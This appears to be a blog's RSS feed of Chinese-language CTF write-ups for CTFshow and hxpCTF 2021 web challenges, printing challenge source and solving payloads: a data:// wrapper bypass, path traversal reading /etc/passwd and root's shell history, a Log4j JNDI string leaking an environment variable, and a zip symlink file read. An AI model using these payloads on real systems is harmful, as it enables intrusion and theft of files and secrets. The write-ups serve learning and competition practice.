<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wp on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/wp/</link><description>Recent content in wp on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 28 Dec 2021 20:06:48 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>CTFshow1221ÊëÜÁÉÇÊùØ Wp</title><link>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</link><pubDate>Tue, 28 Dec 2021 20:06:48 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/28/ctfshow-1221-bailancup-wp/</guid><description>&lt;p>&lt;a href="https://ctf.show/challenges">https://ctf.show/challenges&lt;/a>&lt;/p>
&lt;h2 id="webÁ≠æÂà∞">webÁ≠æÂà∞&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224183707592.png" alt="image-20211224183707592">&lt;/p>
&lt;p>‰∏ÄÁúºflaskÔºåÁÆÄÂçïfuzz‰∏Ä‰∏ãÂèëÁé∞ËøáÊª§‰∫ÜÂ≠óÊØç ÊñúÊù† ÂºïÂè∑ Ê≥®ÈáäÁ¨¶ Ëä±Êã¨Âè∑ ÁôæÂàÜÂè∑ ÁÇπÂè∑&lt;/p>
&lt;p>Ê≤°ËøáÊª§ÁöÑËøòÊúâÊã¨Âè∑ÂíåÂä†Âáè‰πòÈô§&lt;/p>
&lt;pre tabindex="0">&lt;code>A: 114)+(0
B: 1
C: -1
&lt;/code>&lt;/pre>&lt;h2 id="‰∏ÄË°å‰ª£Á†Å">‰∏ÄË°å‰ª£Á†Å&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-
&lt;/span>&lt;span style="color:#75715e"># @Author: h1xa
&lt;/span>&lt;span style="color:#75715e"># @Date: 2021-11-18 21:25:22
&lt;/span>&lt;span style="color:#75715e"># @Last Modified by: h1xa
&lt;/span>&lt;span style="color:#75715e"># @Last Modified time: 2021-11-18 22:14:12
&lt;/span>&lt;span style="color:#75715e"># @email: h1xa@ctfer.com
&lt;/span>&lt;span style="color:#75715e"># @link: https://ctfer.com
&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;filename&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">eregi&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfsho&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfshow&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;filename&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;welcome2ctfshow&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">str_repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Áé∞Âú®ÈÉΩÁà±ËøôÁßç‰∏ÄË°åÊµÅ‰∫ÜÔºü&lt;/p>
&lt;p>Êï¥‰ΩìÊòØ‰∏âÁõÆËøêÁÆóÁ¨¶ÔºåÂ¶ÇÊûúÂâçÈù¢ÁöÑË°®ËææÂºèÊï¥‰Ωì‰∏∫ÁúüÂàôËøîÂõû$flagÔºåËÄåÂ§ñÈù¢ÂèàÂ•ó‰∫Ü&lt;code>!()&lt;/code>ÔºåÊâÄ‰ª•ÈúÄË¶ÅÊã¨Âè∑ÂÜÖÈÉ®‰∏∫ÂÅáÔºåËÄåÂèàÈÉΩÊòØ&lt;code>||&lt;/code>ËøûÊé•ÔºåÊâÄ‰ª•ÈúÄË¶ÅÊØè‰∏™Â∞èÊã¨Âè∑Ëá™Â∑±ÈÉΩ‰∏∫ÂÅáÔºåÊå®‰∏™ÁúãÁúã&lt;/p>
&lt;ul>
&lt;li>&lt;code>$_GET['id']!=0&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ÁªôidËµãÂÄº‰∏∫0ÊàñËÄÖÁõ¥Êé•ÁïôÁ©∫&lt;/p>
&lt;ul>
&lt;li>&lt;code>strlen($_GET['content'])&amp;lt;=7&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>contentÈïø‰∫é7&lt;/p>
&lt;ul>
&lt;li>&lt;code>!eregi(&amp;quot;ctfsho&amp;quot;.substr($_GET['content'],0,1),&amp;quot;ctfshow&amp;quot;)&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>Ê≤°ÂåπÈÖç‰∏∫ÂÅáÔºåÂàôÂåπÈÖç‰∏∫ÁúüÔºåcontent=wwwwwww&lt;/p>
&lt;ul>
&lt;li>&lt;code>substr($_GET['content'],0,1)=='w'&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ÊääcontentÊîπ‰∏™Â§ßÂÜô&lt;/p>
&lt;ul>
&lt;li>&lt;code>file_get_contents($_GET['filename'],'r') !== &amp;quot;welcome2ctfshow&amp;quot;&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>Áî®data://‰º™ÂçèËÆÆ&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>?id=0&amp;amp;content=Wwwwwwww&amp;amp;filename=data://text/plain,welcome2ctfshow
&lt;/code>&lt;/pre>&lt;h2 id="ÈªëÂÆ¢ÁΩëÁ´ô">ÈªëÂÆ¢ÁΩëÁ´ô&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224210814499.png" alt="image-20211224210814499">&lt;/p>
&lt;p>Ê∫êÁ†ÅÊèêÁ§∫ flag‰∏çÂú®Ëøô‰∏™ÊúçÂä°Âô®‰∏äÔºå‰∏çÁî®Êâ´ÊèèÔºå‰∏çÁî®Ê∏óÈÄè&lt;/p>
&lt;p>ÁúãÂ≠óÁ¨¶‰∏≤Êú´Â∞æÊúâonionÔºåÊãºÂú®‰∏ÄËµ∑&lt;/p>
&lt;pre tabindex="0">&lt;code>http://tyros4qws3mmbubgjqje46ncv35jaqjgeb3nqiuf23ijoj4zwasxohyd.onion
&lt;/code>&lt;/pre>&lt;p>ËÆøÈóÆÂ∞±Ë°å‰∫ÜÊçè~&lt;/p>
&lt;h2 id="ÁôªÈôÜ‰∏ç‰∫Ü">***ÁôªÈôÜ‰∏ç‰∫Ü&lt;/h2>
&lt;p>Âú®È™åËØÅÁ†ÅÁöÑÂú∞ÊñπÊúâ‰∏™ÂèÇÊï∞ÔºåÂ∞ùËØïÊñá‰ª∂ÂåÖÂê´&lt;/p>
&lt;pre tabindex="0">&lt;code>http://bf986069-fc4e-42a3-b09b-c966f9e17a3c.challenge.ctf.show/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d
&lt;/code>&lt;/pre>&lt;p>ÈõÄÈ£üÊúâ/etc/passwdÔºå‰ΩÜÊòØÁúã‰∏ç‰∫Ü/flagÔºåÁúã‰∏Ä‰∏ãÂà´ÁöÑ‰∏úË•ø&lt;/p>
&lt;pre tabindex="0">&lt;code># /root/.bash_history
/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vcm9vdC8uYmFzaF9oaXN0b3J5
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224202852805.png" alt="image-20211224202852805">&lt;/p>
&lt;p>Â•ΩÂêßÔºåÁ´üÁÑ∂ÊòØjavaÔºåÂÖàÁà¨‰∫Ü&lt;/p></description></item><item><title>hxpCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/12/20/hxpctf2021-wp/</link><pubDate>Mon, 20 Dec 2021 23:45:08 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/20/hxpctf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ctf.link/internal/challenges">https://2021.ctf.link/internal/challenges&lt;/a>&lt;/p>
&lt;h2 id="log-4-sanity-check">Log 4 sanity check&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&amp;amp;v=6">ALARM ALARM&lt;/a>&lt;/p>
&lt;p>nc 65.108.176.77 1337&lt;/p>
&lt;/blockquote>
&lt;p>ÁúãÂà∞log4jÁöÑÁ¨¨‰∏ÄÂèçÂ∫îÊòØÊãøJNDIÈÇ£‰∏™Â∑•ÂÖ∑Áõ¥Êé•Ê¢≠Ôºå‰ΩÜÊòØÂèëÁé∞Âºπ‰∏çÂá∫Êù•shellÔºà‰∏çÁÆ°ÊòØbash ncËøòÊòØcurl wgetËøô‰∫õ Â∞ùËØï‰∫ÜÂèëÁé∞ÈÉΩ‰∏çË°åÔºâÔºå‰ΩÜÊòØÊòæÁÑ∂ÈúÄË¶Å‰∏Ä‰∏™rceÊàñËÄÖÊòØÊñá‰ª∂ËØªÂèñÁöÑÁÇπÔºåÂÜç‰ªîÁªÜÁúãdockerfileÂèëÁé∞flagÂ∑≤ÁªèË¢´ËØªÂà∞ÁéØÂ¢ÉÂèòÈáè‰∏≠‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220003006386.png" alt="image-20211220003006386">&lt;/p>
&lt;p>ÂîîÔºåÊâÄ‰ª•Áõ¥Êé•ËØª‰∏Ä‰∏ãÊú¨Âú∞ÁéØÂ¢ÉÂèòÈáè‰∏≠ÁöÑflag&lt;/p>
&lt;pre tabindex="0">&lt;code>${jndi:ldap://127.0.0.1/${env:FLAG}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220002554929.png" alt="image-20211220002554929">&lt;/p>
&lt;p>&lt;code>hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}&lt;/code>&lt;/p>
&lt;h2 id="unzipper">unzipper&lt;/h2>
&lt;blockquote>
&lt;p>Here, let me unzip that for you.&lt;/p>
&lt;p>http://65.108.176.76:8200/&lt;/p>
&lt;/blockquote>
&lt;p>index.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session_start&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;data/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$lock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;.lock&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fopen&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">flock&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$lock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">LOCK_EX&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#75af00">LOCK_NB&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0700&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">or&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;chdir&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ulimit -v 8192 &amp;amp;&amp;amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/(^$|flag)/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">realpath&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">?:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">readfile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$lock&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁúãÂà∞zipÊÉ≥Âà∞ËÇØÂÆöË∑üËΩØÈìæÊé•ËØªÊñá‰ª∂ÊúâÂÖ≥Ôºà‰ΩÜÊòØËøôÁßçÂßøÂäøÊ≤°ÊúâËßÅËøáÔºåÂ≠¶Âà∞‰∫Ü&lt;/p>
&lt;p>ËøôÈáåÂÆûÁé∞‰∫Ü‰∏§‰∏™ÂäüËÉΩÔºåÈ¶ñÂÖàÊòØunzip POST‰∏ä‰º†ÁöÑzipÊñá‰ª∂ÔºåÂè¶‰∏Ä‰∏™ÊòØÂØπGETÁöÑfileÂèÇÊï∞ËøõË°åÊñá‰ª∂ËØªÂèñÔºåÂπ∂‰∏îÂØπÂèÇÊï∞ËøõË°å‰∫Ü&lt;code>realpath()&lt;/code>ÁöÑÂ§ÑÁêÜÔºåÂÆÉ‰ºöËß£ÊûêËΩØÈìæÊé•ÁöÑË∑ØÂæÑÔºåÂπ∂‰∏îÊúâ‰∏Ä‰∏™Ê≠£ÂàôÂåπÈÖçË¶ÅÊ±Ç‰∏çËÉΩÊúâflagÔºàÂ§ßÂ∞èÂÜô‰∏çÊïèÊÑüÔºâÔºå‰πãÂêéÂèØ‰ª•ÈÄöËøá&lt;code>readfile()&lt;/code>ËØªÊñá‰ª∂ÔºåÂèÇÊï∞ÊòØ‰∏çÁªèËøáÊª§ÁöÑfile&lt;/p>
&lt;p>&lt;code>readfile&lt;/code>Êúâ‰∏Ä‰∏™ÁâπÊÄßÊòØÊé•ÂèóurlË∑ØÂæÑÁöÑÂèÇÊï∞ÔºåÊØîÂ¶Ç&lt;code>file:///flag.txt&lt;/code>Ôºå‰ºöÂ∞ÜÂÖ∂ËßÜ‰ΩúurlÂéªËØªÂèñ&lt;code>/flag.txt&lt;/code>ÔºåËÄå&lt;code>realpath&lt;/code>‰ºöÂ∞ÜÂÖ∂ËßÜ‰Ωú&lt;code>file:&lt;/code>Êñá‰ª∂Â§π‰∏ãÁöÑ&lt;code>flag.txt&lt;/code>Êñá‰ª∂&lt;/p>
&lt;p>Êàë‰ª¨ÂèØ‰ª•Âà∂‰Ωú‰∏Ä‰∏™ÊåáÂêë&lt;code>file:&lt;/code>Êñá‰ª∂Â§π‰∏≠ÁöÑxyzÔºà‰ªªÊÑèÊñá‰ª∂ÔºâÁöÑÂêç‰∏∫&lt;code>flag.txt&lt;/code>ÁöÑËΩØÈìæÊé•ÔºåÂÆÉÂú®&lt;code>realpath&lt;/code>Êó∂Ë¢´Êâ©Â±ï‰∏∫&lt;code>...../file:/xyz&lt;/code> ÂèØ‰ª•ÈÄöËøáifÊØîËæÉÔºåËÄåÂú®&lt;code>readfile&lt;/code>‰∏≠Âàô‰ºöÊåâÁÖßurlÁöÑÊñπÂºèËøõË°åËß£ÊûêÔºàË∑ü‰ªÄ‰πàËΩØÈìæÊé•Â∞±Ê≤°ÂÖ≥Á≥ª‰∫ÜÔºâÔºåËØªÂèñÊ†πÁõÆÂΩï‰∏ãÁöÑflag.txt&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">mkdir file:
&lt;span style="color:#111">cd&lt;/span> file:
touch amiz.txt
ln -s amiz.txt flag.txt
&lt;span style="color:#111">cd&lt;/span> ..
zip -ry tttttemp.zip file:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220105743255.png" alt="image-20211220105743255">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211220105724345.png" alt="image-20211220105724345">&lt;/p>
&lt;p>&lt;code>hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://mikecat.github.io/ctf-writeups/2021/20211218_hxp_CTF_2021/WEB/unzipper/#en">wp&lt;/a>&lt;/p>
&lt;h2 id="shitty-blog">shitty blog&lt;/h2>
&lt;blockquote>
&lt;p>Please use my shitty blog ü§é!&lt;/p>
&lt;p>http://65.108.176.96:8888/&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code class="language-php+HTML" data-lang="php+HTML">&amp;lt;?php
// TODO: fully implement multi-user / guest feature :(
$secret = 'SECRET_PLACEHOLDER';
$salt = '$6$'.substr(hash_hmac('md5', $_SERVER['REMOTE_ADDR'], $secret), 16).'$';
if(! isset($_COOKIE['session'])){
$id = random_int(1, PHP_INT_MAX);
$mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);
}
else {
$session = explode('|', $_COOKIE['session']);
if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
exit();
}
$id = $session[0];
$mac = $session[1];
}
setcookie('session', $id.'|'.$mac);
$sandbox = './data/'.md5($salt.'|'.$id.'|'.$mac);
if(! is_dir($sandbox)) {
mkdir($sandbox);
}
$db = new PDO('sqlite:'.realpath($sandbox).'/blog.sqlite3');
$db-&amp;gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db-&amp;gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$schema = &amp;quot;
CREATE TABLE IF NOT EXISTS user (id INTEGER PRIMARY KEY, name VARCHAR(255));
CREATE TABLE IF NOT EXISTS entry (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, content TEXT);
INSERT OR IGNORE INTO user (id, name) VALUES (0, 'System');
INSERT OR IGNORE INTO entry (id, user_id, content) VALUES (0, 0, 'Welcome to your new blog - üö©üö©üö©  ï‚Ä¢ÃÅ·¥•‚Ä¢ÃÄ î„Å£ü§é üö©üö©üö©');
&amp;quot;;
$db-&amp;gt;exec($schema);
function get_entries($db){
$sth = $db-&amp;gt;query('SELECT id, user_id, content FROM entry ORDER BY id DESC');
return $sth-&amp;gt;fetchAll();
}
function get_user($db, $user_id) : string {
foreach($db-&amp;gt;query(&amp;quot;SELECT name FROM user WHERE id = {$user_id}&amp;quot;) as $user) {
return $user['name'];
}
return 'me';
}
function insert_entry($db, $content, $user_id) {
$sth = $db-&amp;gt;prepare('INSERT INTO entry (content, user_id) VALUES (?, ?)');
$sth-&amp;gt;execute([$content, $user_id]);
}
function delete_entry($db, $entry_id, $user_id) {
$db-&amp;gt;exec(&amp;quot;DELETE from entry WHERE {$user_id} &amp;lt;&amp;gt; 0 AND id = {$entry_id}&amp;quot;);
}
if(isset($_POST['content'])) {
insert_entry($db, htmlspecialchars($_POST['content']), $id);
header('Location: /');
exit;
}
$entries = get_entries($db);
if(isset($_POST['delete'])) {
foreach($entries as $key =&amp;gt; $entry) {
if($_POST['delete'] === $entry['id']){
delete_entry($db, $entry['id'], $entry['user_id']);
break;
}
}
header('Location: /');
exit;
}
foreach($entries as $key =&amp;gt; $entry) {
$entries[$key]['user'] = get_user($db, $entry['user_id']);
}
?&amp;gt;
&amp;lt;!doctype html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
&amp;lt;title&amp;gt;My shitty Blog&amp;lt;/title&amp;gt;
&amp;lt;link rel=&amp;quot;icon&amp;quot; type=&amp;quot;image/png&amp;quot; href=&amp;quot;/favicon.png&amp;quot;/&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;My shitty blog&amp;lt;/h1&amp;gt;
&amp;lt;form method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;textarea cols=&amp;quot;50&amp;quot; rows=&amp;quot;10&amp;quot; name=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;/textarea&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Post&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php foreach($entries as $entry):?&amp;gt;
&amp;lt;div&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;?= $entry['content'] ?&amp;gt;&amp;lt;/p&amp;gt;
